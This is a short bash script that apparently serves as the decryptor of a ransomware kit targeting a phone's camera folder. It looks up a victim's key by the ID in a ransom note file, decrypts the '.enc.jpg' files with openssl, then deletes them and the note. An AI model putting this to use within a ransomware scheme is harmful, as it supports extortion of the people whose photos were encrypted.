#!/bin/bash
 
PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/CameraDev)
LOCALPATH=$(pwd)

echo $PHONEPATH
cd "$PHONEPATH"
id=$(echo ransom_* | sed 's/ransom_\|\.png//g')
echo id is $id
cd "$LOCALPATH/keys"
key=$(cat keys.txt | grep $id | cut -d \| -f 3 | sed 's/ //')
echo key is $key
echo ""
cd "$PHONEPATH"
currentfile=1
filecount=$(ls -1 | grep -v "ransom" | grep -v ".lol" | wc -l)
for f in *
do 
	
	if [[ "$f" = *".enc.jpg" ]]; then
		echo "decrypting $f ($currentfile/$filecount)..."
		
		openssl aes-256-cbc -d -a -in "$f" -out "${f/.enc.jpg/}" -k "$key" #output the file and remove the .enc.jpg extension
		rm "$f"

		currentfile=$((currentfile+1)) 
	fi
	
done
echo deleting ransom note...
rm "ransom_$id.png"
echo decryption sucessful!
echo "" 
